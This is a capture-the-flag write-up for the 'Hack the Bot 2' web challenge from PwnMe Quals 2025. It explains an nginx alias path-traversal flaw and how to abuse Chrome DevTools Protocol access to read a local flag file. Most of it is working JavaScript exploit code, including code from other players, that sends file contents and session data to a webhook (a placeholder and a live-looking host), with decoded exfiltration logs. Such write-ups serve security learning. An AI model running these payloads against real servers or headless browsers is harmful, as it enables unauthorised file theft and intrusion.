---
title: "Hack the Bot 2"
description: "I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it?"
pubDate: 2025-03-12
ctf: "PwnMe Quals 2025"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/25-pwnmequals/icon.png"
---



> This was a post-solve of the challenge!

This was a hard whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Hack_the_bot_). I had some issues with the Dockerfile and had to modify it to install the Chrome drivers properly.

## Initial Look

The program is the same as the one described in the 'Initial Look' section of the [Hack the Bot 1](25-pwnmequals-hackthebot1) writeup.

This time the flag is stored in a folder, you can see it being moved in the `Dockerfile`:
```docker
...
COPY flag2.txt /root/
...
```

## Nginx Misconfiguration

Looking at the `nginx` configuration file, there is an error:
```
events{}
user root;

http {
    server {
        listen 80;

        location / {
            proxy_pass http://127.0.0.1:5000;
        }

        location /logs {
            autoindex off;
            alias /tmp/bot_folder/logs/;
            try_files $uri $uri/ =404;
        }
    }
}
```

There are more details [here](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/) but here is a brief summary.

Nginx `alias` is a replacement for the path specified in `location`, for example:
```
location /i/ {
    alias /data/w3/images/;
}
```

If I sent a request to `/i/example.txt` it is getting the file from `/data/w3/images/example.txt`.

Our configuration has the following (with some lines removed for brevity):
```
location /logs {
    alias /tmp/bot_folder/logs/;
}
```

Due to the lack of the closing `/` on `/logs`, we can achieve path traversal.

We can just read the flag now! `http://localhost/logs../../../root/flag2.txt`... Just kidding, we don't have permissions.

After a decent amount of poking around, I am shown Chrome DevTools Protocol!

## Chrome DevTools Protocol

This is a websocket connection used with a path and port specified in `DevToolsActivePort` (which we can access with the nginx misconfiguration). It allows for a lot of functionality which can be read up more on [here](https://chromedevtools.github.io/devtools-protocol/) but a few features caught my eye:

> Note: I couldn't get `Page` features working but I think that's because I was not on an active page yet with my commands, I'll outline further why later.

`Target` has some interesting capabilites such as:
- [`createTarget`](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-createTarget) - Creates a new page.
- [`attachToTarget`](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-attachToTarget) - Attaches to the target with given id.

Once attached we can use `Runtime` features which seem very useful:
- [`enable`](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-enable) - Enables reporting of execution contexts creation by means of `executionContextCreated` event. When the reporting gets enabled the event will be sent immediately for each existing execution context.
- [`evaluate`](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate) - Evaluates expression on global object.

If we could create a terget to the `file:///` URI and then attach to that target, we could then utilise `Runtime.evaluate` to read the content of the page?

## Starting small

Let's work on a basic payload just to connect to devtools:
```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://WEBHOOK/`
  
  ws = new WebSocket(wsUrl);
  let targetId = null;
  
  ws.onopen = () => {
    fetch(`${webhook}?${wsUrl}`);
  };
  
  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
  
  ws.onclose = () => {
    fetch(`${webhook}?weclosed`);
  };
})();
```

I then use my Script SRC payload from [Hack the Bot 1](25-pwnmequals-hackthebot1) to get the JS file, and report the link pointing to the JS payload.

We get a response on the webhook:
`/?ws://localhost:44629/devtools/browser/80e93e6f-0f0f-46ee-be2f-45e036a2afc8`

Woo!

## Commands

I start with a command `createTarget` to initialise a file URI to the flag.

```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://WEBHOOK/`
  
  ws = new WebSocket(wsUrl);
  let targetId = null;
  
  ws.onopen = () => {
    const createTargetCommand = {
      id: 1,
      method: 'Target.createTarget',
      params: { url: "file:///root/flag2.txt" }
    };
    ws.send(JSON.stringify(createTargetCommand));
    fetch(`${webhook}?openedWS`);
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    fetch(`${webhook}?received=${btoa(event.data)}`);
    ws.close();
  };
  
  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
  
  ws.onclose = () => {
    fetch(`${webhook}?weclosed`);
  };
})();
```

We get our responses!
```
GET /a HTTP/1.1
GET /?weclosed HTTP/1.1
GET /?openedWS HTTP/1.1
GET /?received=eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjQ0RDkzQjAxRDgzODNCOURBMzEzNjdGODE0MzhBMDQifX0= HTTP/1.1
```

Base64 decoding the recieved data:
```bash
$ echo "eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjQ0RDkzQjAxRDgzODNCOURBMzEzNjdGODE0MzhBMDQifX0=" | base64 -d
{"id":1,"result":{"targetId":"644D93B01D8383B9DA31367F81438A04"}}
```
Yay! We get a `targetId` and we can now use that for a `Target.attachToTarget`!

```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://WEBHOOK/`
  
  ws = new WebSocket(wsUrl);
  let targetId = null;
  
  ws.onopen = () => {
    const createTargetCommand = {
      id: 1,
      method: 'Target.createTarget',
      params: { url: "file:///root/flag2.txt" }
    };
    ws.send(JSON.stringify(createTargetCommand));
    fetch(`${webhook}?openedWS`);
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    fetch(`${webhook}?received=${btoa(event.data)}`);
    
    if (data && data.id === 1 && data.result && data.result.targetId) {
      targetId = data.result.targetId;
      fetch(`${webhook}?gotTargetId=${targetId}`);
      
      const attachCommand = {
        id: 2,
        method: 'Target.attachToTarget',
        params: { 
          targetId: targetId,
          flatten: true
        }
      };
      ws.send(JSON.stringify(attachCommand));
    }

    if (data && data.id === 2) {
      ws.close();
    }
  };
  
  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
  
  ws.onclose = () => {
    fetch(`${webhook}?weclosed`);
  };
})();
```

We get a response:
```
GET /a HTTP/1.1
GET /?received=eyJpZCI6MiwicmVzdWx0Ijp7InNlc3Npb25JZCI6Ijk4NkVCQ0I4NjM1NTA5RkYxQUYzODVFQzY3NEUyMENBIn19 HTTP/1.1
GET /?gotTargetId=699F59AF8810559BCF735269079AAC78 HTTP/1.1
GET /?openedWS HTTP/1.1
GET /?received=eyJtZXRob2QiOiJUYXJnZXQuYXR0YWNoZWRUb1RhcmdldCIsInBhcmFtcyI6eyJzZXNzaW9uSWQiOiI5ODZFQkNCODYzNTUwOUZGMUFGMzg1RUM2NzRFMjBDQSIsInRhcmdldEluZm8iOnsidGFyZ2V0SWQiOiI2OTlGNTlBRjg4MTA1NTlCQ0Y3MzUyNjkwNzlBQUM3OCIsInR5cGUiOiJwYWdlIiwidGl0bGUiOiIiLCJ1cmwiOiJmaWxlOi8vL3Jvb3QvZmxhZzIudHh0IiwiYXR0YWNoZWQiOnRydWUsImNhbkFjY2Vzc09wZW5lciI6ZmFsc2UsImJyb3dzZXJDb250ZXh0SWQiOiI3RThFNDYyNkVCQjBBNUY3QkIzQkFBNEJCMUUxRTgxNCJ9LCJ3YWl0aW5nRm9yRGVidWdnZXIiOmZhbHNlfX0= HTTP/1.1
GET /?received=eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjk5RjU5QUY4ODEwNTU5QkNGNzM1MjY5MDc5QUFDNzgifX0= HTTP/1.1
GET /?weclosed HTTP/1.1
```

It's all out of order because asynchronous-y things, but we can decode the portions and get the following:
```bash
$ echo "eyJpZCI6MiwicmVzdWx0Ijp7InNlc3Npb25JZCI6Ijk4NkVCQ0I4NjM1NTA5RkYxQUYzODVFQzY3NEUyMENBIn19" | base64 -d                                                                                        
{"id":2,"result":{"sessionId":"986EBCB8635509FF1AF385EC674E20CA"}}
$ echo "eyJtZXRob2QiOiJUYXJnZXQuYXR0YWNoZWRUb1RhcmdldCIsInBhcmFtcyI6eyJzZXNzaW9uSWQiOiI5ODZFQkNCODYzNTUwOUZGMUFGMzg1RUM2NzRFMjBDQSIsInRhcmdldEluZm8iOnsidGFyZ2V0SWQiOiI2OTlGNTlBRjg4MTA1NTlCQ0Y3MzUyNjkwNzlBQUM3OCIsInR5cGUiOiJwYWdlIiwidGl0bGUiOiIiLCJ1cmwiOiJmaWxlOi8vL3Jvb3QvZmxhZzIudHh0IiwiYXR0YWNoZWQiOnRydWUsImNhbkFjY2Vzc09wZW5lciI6ZmFsc2UsImJyb3dzZXJDb250ZXh0SWQiOiI3RThFNDYyNkVCQjBBNUY3QkIzQkFBNEJCMUUxRTgxNCJ9LCJ3YWl0aW5nRm9yRGVidWdnZXIiOmZhbHNlfX0=" | base64 -d
{"method":"Target.attachedToTarget","params":{"sessionId":"986EBCB8635509FF1AF385EC674E20CA","targetInfo":{"targetId":"699F59AF8810559BCF735269079AAC78","type":"page","title":"","url":"file:///root/flag2.txt","attached":true,"canAccessOpener":false,"browserContextId":"7E8E4626EBB0A5F7BB3BAA4BB1E1E814"},"waitingForDebugger":false}}
$ echo "eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjk5RjU5QUY4ODEwNTU5QkNGNzM1MjY5MDc5QUFDNzgifX0=" | base64 -d
{"id":1,"result":{"targetId":"699F59AF8810559BCF735269079AAC78"}}
```

Yay things are working! In that second decoded string we can see that's the response to the `Target.attachToTarget`, and listed is `"attached":true`!

Let's move on to execution:

## The fun!

This is the same payload as before, we are now adding on the following:
```js
...
    else if (data && data.id === 2 && data.result && data.result.sessionId) {
      const sessionId = data.result.sessionId;
      fetch(`${webhook}?gotSessionId=${sessionId}`);
      
      const enableRuntimeCommand = {
        id: 3,
        method: 'Runtime.enable',
        params: {},
        sessionId: sessionId
      };
      ws.send(JSON.stringify(enableRuntimeCommand));
    }

    else if (data && data.id === 3){
      ws.close();
    }
...
```

This will enable `Runtime` commands!

We get this new response: `{"id":3,"result":{},"sessionId":"3AE5046B90DE80963D8144DE14A75FAF"}`

I now use `evaluate` to get the page content!

```js
...
const evaluateCommand = {
  id: 4 + checkAttempts,
  method: 'Runtime.evaluate',
  params: {
    expression: 'document.documentElement.outerHTML',
    returnByValue: true
  },
  sessionId: sessionId
};
ws.send(JSON.stringify(evaluateCommand));
...
```

This *should* work fine, but it doesn't as page content takes time to load, so we need to continously check for the content in the HTML. We know the flag starts with `PWNME` so let's wait for that:
```js
...
else if (data && data.id === 2 && data.result && data.result.sessionId) {
  sessionId = data.result.sessionId;
  fetch(`${webhook}?gotSessionId=${sessionId}`);
  const enableRuntimeCommand = {
    id: 3,
    method: 'Runtime.enable',
    params: {},
    sessionId: sessionId
  };
  ws.send(JSON.stringify(enableRuntimeCommand));
  checkContent();
}
...
else if (data && data.id >= 4) {
  if (data.result && data.result.result && data.result.result.value) {
    const content = data.result.result.value;
    if (content.includes('PWNME')) {
      fetch(`${webhook}?found=PWNME&content=${btoa(content)}`);
      ws.close();
    } else  {
      setTimeout(checkContent, 1000);
    }
  } else {
    setTimeout(checkContent, 1000);
  }
}
...
function checkContent() {
  if (sessionId) {
    checkAttempts++;
    const evaluateCommand = {
      id: 4 + checkAttempts,
      method: 'Runtime.evaluate',
      params: {
        expression: 'document.documentElement.outerHTML',
        returnByValue: true
      },
      sessionId: sessionId
    };
    ws.send(JSON.stringify(evaluateCommand));
  }
}
...
```

So now it will setup this `checkContent()` function in the `enable` command, then check the content for the response, if it doesn't contain `PWNME` wait a second and go again until we find it!


## The Solve!

```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://server.blackmail.zip/`;
  ws = new WebSocket(wsUrl);
  let targetId = null;
  let sessionId = null;
  let checkAttempts = 0;

  ws.onopen = () => {
    const createTargetCommand = {
      id: 1,
      method: 'Target.createTarget',
      params: { url: "file:///root/flag2.txt" }
    };
    ws.send(JSON.stringify(createTargetCommand));
    fetch(`${webhook}?openedWS`);
  };

  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);    
    if (data && data.id === 1 && data.result && data.result.targetId) {
      targetId = data.result.targetId;
      fetch(`${webhook}?gotTargetId=${targetId}`);
      const attachCommand = {
        id: 2,
        method: 'Target.attachToTarget',
        params: {
          targetId: targetId,
          flatten: true
        }
      };
      ws.send(JSON.stringify(attachCommand));
    }
    else if (data && data.id === 2 && data.result && data.result.sessionId) {
      sessionId = data.result.sessionId;
      fetch(`${webhook}?gotSessionId=${sessionId}`);
      const enableRuntimeCommand = {
        id: 3,
        method: 'Runtime.enable',
        params: {},
        sessionId: sessionId
      };
      ws.send(JSON.stringify(enableRuntimeCommand));
    }
    else if (data && data.id >= 4) {
      if (data.result && data.result.result && data.result.result.value) {
        const content = data.result.result.value;
        if (content.includes('PWNME')) {
          fetch(`${webhook}?found=PWNME&content=${btoa(content)}`);
          ws.close();
        } else  {
          setTimeout(checkContent, 1000);
        }
      } else {
        setTimeout(checkContent, 1000);
      }
    }
  };

  function checkContent() {
    if (sessionId) {
      checkAttempts++;
      const evaluateCommand = {
        id: 4 + checkAttempts,
        method: 'Runtime.evaluate',
        params: {
          expression: 'document.documentElement.outerHTML',
          returnByValue: true
        },
        sessionId: sessionId
      };
      ws.send(JSON.stringify(evaluateCommand));
    }
  }

  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
})();
```

The response to the solve:
```
GET /a HTTP/1.1
GET /?openedWS HTTP/1.1
GET /?gotTargetId=E163C43EFF2F0BCC816058D3F1E11561 HTTP/1.1
GET /?gotSessionId=98047CDC4DEE1E748BA7CA2667C39C33 HTTP/1.1
GET /?found=PWNME&content=PGh0bWw+PGhlYWQ+PG1ldGEgbmFtZT0iY29sb3Itc2NoZW1lIiBjb250ZW50PSJsaWdodCBkYXJrIj48L2hlYWQ+PGJvZHk+PHByZSBzdHlsZT0id29yZC13cmFwOiBicmVhay13b3JkOyB3aGl0ZS1zcGFjZTogcHJlLXdyYXA7Ij5QV05NRXtGQUtFX0ZMQUd9CjwvcHJlPjwvYm9keT48L2h0bWw+ HTTP/1.1
```

Flag: `PWNME{FAKE_FLAG_BECAUSE_THIS_IS_A_POSTSOLVE}`


## Other Solutions

### DOM

User `TechnologicNick` had a solve using `DOM`:

```js
...
devtools.onopen = () => {
        callback("Opened");

        devtools.send(JSON.stringify({
            id: 1,
            method: 'Target.createTarget',
            params: {
                url: "file:///root/flag2.txt",
            },
        }));
    };

    devtools.onerror = (err) => {
        console.error('WebSocket Error: ', err);
        callback("WebSocket Error: " + err);
    }

    devtools.onmessage = (event) => {
        // const {result: {result: {value}}} = JSON.parse(data);
        // console.log('WebSocket Message Received: ', value)
        callback("<-- " + event.data);
        const obj = JSON.parse(event.data);

        if (obj.id === 1 && sessionId === null) {
            const targetId = obj.result.targetId;

            devtools.send(JSON.stringify({
                id: 2,
                method: 'Target.attachToTarget',
                params: {
                    targetId,
                    flatten: true
                }
            }));
        } else if (obj.id === 2 && sessionId === null) {
            sessionId = obj.result.sessionId;

            devtools.send(JSON.stringify({
                sessionId,
                id: 3,
                method: 'DOM.getDocument',
            }));

            devtools.send(JSON.stringify({
                sessionId,
                id: 4,
                method: 'DOM.getOuterHTML',
                params: {"nodeId":1}
            }));

            // Wait for DOM.documentUpdated
            setTimeout(() => {
                devtools.send(JSON.stringify({
                    sessionId,
                    id: 5,
                    method: 'DOM.getDocument',
                }));
                devtools.send(JSON.stringify({
                    sessionId,
                    id: 6,
                    method: 'DOM.getOuterHTML',
                    params: {"nodeId":5}
                }))
            }, 1000);
        }

    };
```

They waited 1s for a DOM.documentUpdated and then retrieved the contents again with `DOM.getOuterHTML`!

### Page and Evaluate
This clean solution by `aelmo` uses `Page` and `Evaluate` (which I could not get working myself):
```js
function connectPage(port, targetId, hook) {
  const ws = new WebSocket(`ws://localhost:${port}/devtools/page/${targetId}`);

  ws.onopen = () => {
    ws.send(
      JSON.stringify({
        id: 1,
        method: "Page.navigate",
        params: { url: "file:///root/flag2.txt" },
      })
    );

    fetch(hook + "connected");
  };

  ws.onmessage = (event) => {
    fetch(hook + "msg", { method: "POST", body: event.data });
    let data = JSON.parse(event.data);

    switch (data.id) {
      case 1:
        ws.send(
          JSON.stringify({
            id: 2,
            method: "Runtime.evaluate",
            params: { expression: "document.body.innerHTML" },
          })
        );
        break;
    }
  };
}
```

Just using a `Page.navigate` to direct, then evaluating the `innerHTML`.

### RCE?

Player `jopraveen` has an [awesome writeup I suggest you read](https://jopraveen.github.io/web-hackthebot/) that solved both [Hack the Bot 1](25-pwnmequals-hackthebot1) and this challenge using an n-day in outdated Chrome to get RCE!